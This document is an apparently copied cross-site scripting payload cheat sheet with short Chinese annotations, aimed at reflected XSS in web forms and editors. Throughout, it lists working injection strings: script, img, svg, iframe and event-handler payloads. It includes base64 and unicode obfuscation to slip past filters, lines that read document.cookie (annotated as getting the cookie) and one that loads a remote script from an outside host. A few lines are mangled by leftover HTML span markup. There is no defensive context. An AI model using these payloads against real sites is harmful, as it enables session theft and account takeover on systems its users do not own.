```plain
XSS
反射型xss(get)
<script>标签
<script>alert('666')</script>
<script>alert(666)</script>

<script>alert(document.cookie)</script>

<img src=1 onerror=alert(2)>

["');alert('XSS');//"]@xyz.xxx

"><script>alert('666')</script>
"><script>alert(666)</script>

</textarea><script>alert('666')</script>
</textarea><script>alert(666)</script>

"><svg/onload=alert(1)>

<svg/onload=alert`1`>

<script/src=//⑭.₨>

<svg>标签
<svg onload='alert(1)'><=" " span=" ">

<body>标签
<body onload=alert(1)>

<style>标签
<style onload=alert(1)>

<video>标签
<video onloadstart=alert(1) src='/media/hack-the-planet.mp4'/>

<img>标签
<img src=1 onerror=alert(document.cookie)>
获取到cookie

XSS
"><script>alert("老鼠")</script>
\x22\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22\x31\x22\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e

"><script>alert(document.cookie);</script>  //获取cookie

<iframe src=http://www.baidu.com>

<div class="c-comment-box"></div><script>Function(atob('YWxlcnQoYDFgKQ=='))();</script>

"></div><script>Function(atob('YWxlcnQoYDFgKQ=='))();</script>

"></div><script>+-+-1-+-+alert(1)</script>
"></div><script>+-+-1-+-+alert(1)</script>//

双开括号
"></div><<SCRIPT>alert("1");//<</SCRIPT>//


"></div><SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

内联框架注入
"><iframe src=javascript:alert(1)>

超链接注入
"><a href="javascript:alert(1)">漏洞</a>

javascript链接：
"><A HREF="javascript:document.location='http://www.google.com/'">XSS</A>

编辑器漏洞XSS
%3Cp%3E1111111"><ImG sRc=1 OnErRoR=prompt(1)>%3Cbr%2F%3E%3C%2Fp%3E

<p>1111111"><ImG sRc=1 OnErRoR=prompt(2)><br/></p>//

<p>1111111"><br/></p>


"true" "ondragenter=confirm(1)" src="alert(<span class="code-snippet__number"

style="box-sizing: border-box;">1</span>)">test111""prompt(1)"

contenteditable>test222"" autofocus tabindex=1>test

""true" ondragenter=confirm(1) style="width:100px,height:100px">test"1</span>)<span

class="code-snippet__string" style="box-sizing: border-box;">">"

frPid输入100000'; var abc=top['doc'+'ument']['coo'+'kie']; top['al'+'ert'](abc); var aa='2  进行url编码后发送请求


<img src=1 onerror=co\u006efir\u006d`1223x`>

不常用标签<h1>
"><h1>XSS</h1>

看见框或者可以预览的话
<img src="1" style="width:300px; height:200px;">
<a href="1">xss link</a>
<a href="aa">aa</a>
<h1>abc</h1>


<a href=//@www.baidu.com>test</a>



```

